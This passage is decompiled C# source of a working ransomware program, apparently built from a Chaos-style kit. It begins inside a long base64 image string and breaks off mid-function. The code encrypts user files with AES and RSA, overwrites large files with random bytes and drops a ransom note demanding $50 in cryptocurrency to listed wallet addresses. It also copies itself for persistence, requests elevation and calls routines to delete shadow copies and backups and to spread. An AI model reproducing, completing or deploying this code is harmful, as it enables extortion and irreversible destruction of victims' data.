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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = false;

	private static bool checkdeleteShadowCopies = false;

	private static bool checkdisableRecoveryMode = false;

	private static bool checkdeleteBackupCatalog = false;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[26]
	{
		"All of your files have been encrypted", "Your computer was infected with a ransomware and RDP virus. ", "Your files and data have been encrypted and you won't be able to decrypt them without our help.", "What can I do to get my files back?", "You can buy our special decryption software, this software will allow you to recover all of your data and remove the", "ransomware from your computer.", "The price for the software is $50. ", "Payment can be made in Crypto only.", "How do I pay, where do I get Crypto?", "Purchasing Crypto varies from country to country, you are best advised to do a quick google search",
		"yourself  to find out how to buy Crypto. ", "Many of our customers have reported these sites to be fast and reliable:", "Cashapp, Coinbase, bicance, Paypal, Kraken ", "Once the payment has been made you can email us and a Decryption key will be sent to you.", "All Restore Points, Shadow Coppies and recovery mode on ur computer have been deleted/disabled ", "Clients Must pay or sadly ALL data and files are lost, PC Reset will resualt in disabling windows operations", "", "If you have any questions please email us, but also remember, we dont make this Ransomeware, just the decryption keys.", "", "Email: foheg17549@marchub.com",
		"", "Payment Amount: $50.00 ", "Bitcoin Address: bc1qmxehlpjkuk4xpanapdnsghda2eajdhj0wyvhlc  ", "Litecoin Address Lg6PmtU6vusUH3DhYR4QL6h2UtLkzwHrfL", "Ethereum Address: 0x2ad0e5ABc63d003448Fbe03f580Aa30e5E831d09", "Solana Address: 7iKLcDfUqJrbkFk7V1AUQ7RhyyN5qVzv6DWnBvHENW3f"
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>rPRFbam2Z9nn+qkrQXRDAwDZgKdLFzfRmPRLHz3CNBTOcsbk0EI7VC5OOmJ61rpG9Y868q27JhpvfnatEYHNjUJOF5nLknftaqMHPxE+0OCfE7Bw5b94munHTU7DdSS07GDBOgH6kpNP7Qn9ThBVV6HBYv8hfyEdF4fSbf6EQc0=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
